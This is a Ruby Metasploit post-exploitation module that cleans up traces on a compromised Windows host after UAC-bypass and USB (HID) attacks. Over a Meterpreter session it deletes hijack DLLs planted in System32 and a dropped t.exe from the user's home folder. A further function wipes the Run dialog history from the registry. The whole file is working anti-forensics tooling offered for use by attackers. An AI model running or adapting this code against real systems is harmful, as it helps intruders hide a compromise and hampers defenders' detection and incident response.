##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

REG_PATH = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
REMOVE_LIST = ['C:\\WINDOWS\\System32\\NTWDBLIB.dll', 'C:\Windows\\System32\\sysprep\\CRYPTBASE.dll']
HOMEPATH_LIST = ['t.exe']

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::UserProfiles
  
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Module to cleanup after other modules and exploits',
      'Description'   => %q{
        This module will cleanup after bypassuac and USB Exploits.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Josh Hale "sn0wfa11"'],
      'Platform'      => 'win',
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          ['URL', 'https://github.com/jhale85446/HID-Attacks']
        ]
    ))
    end

  def run
    files = REMOVE_LIST.dup
    home_files = HOMEPATH_LIST.dup
    print_status("Cleaning up files.")
    removed = true

    if is_admin?
      files.each do |file|
        removed = delete_file(file)
      end
    else
      if get_homepath
        homepath = get_homepath
        home_files.each do |file|
          removed = delete_file(homepath + file)
        end
      end
    end

    if removed
      print_good("\tAll files have been removed")
    else
      print_error("Some or all files still on target.")
    end
  end

  # This function will remove the Windows Run Dialog's history.
  #
  # @return [TrueClass] If the entries were successfully removed or they are not present on the target system.
  # @return [FalseClass] If the entries were unable to be removed.
  def cleanup_reg
    entries = []
    entries << registry_enumvals(REG_PATH)

    print_status("Clearing Windows Run Dialog History")

    entries.flatten.map do |entry|
      begin
        registry_deleteval(REG_PATH, entry)
      rescue ::Rex::Post::Meterpreter::RequestError => error
        print_error("Could not remove the registry entry.")
        print_error(error.to_s)
        return false
      end
    end
    print_good("\tHistory Cleared!")
    return true
  end

  # This function will return the current user's homepath.
  #
  def get_homepath
    sid = client.sys.config.getsid
    profile_path = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\#{sid}","ProfileImagePath")
    
    if !profile_path.include?("Users")
      print_status("\tSID: #{sid} is not a normal user. Skipping.")
      return nil
    end

    profile_path = profile_path.strip
    profile_path = profile_path.gsub('\\', '/')

    return "#{profile_path}/"
  end

  # This function will delete a file.
  #
  # @return [TrueClass] If the file was deleted or not present to begin with
  # @return [FalseClass] If the file unable to be deleted.
  def delete_file(file)
    begin
      if exist?(file)
        print_status("Removing: #{file}")
        session.fs.file.delete(file)
        if !exist?(file)
          print_good("\tFile Removed!")
          return true         
        else
          print_error("\tUnable to remove file: #{file}")
          return false
        end      
      else
        print_good("File #{file} not present.")
        return true
      end
    rescue ::Rex::Post::Meterpreter::RequestError => error
      print_error("Unable to remove file: #{file}.")
      print_error(error.to_s)
      return false
    end
  end
end
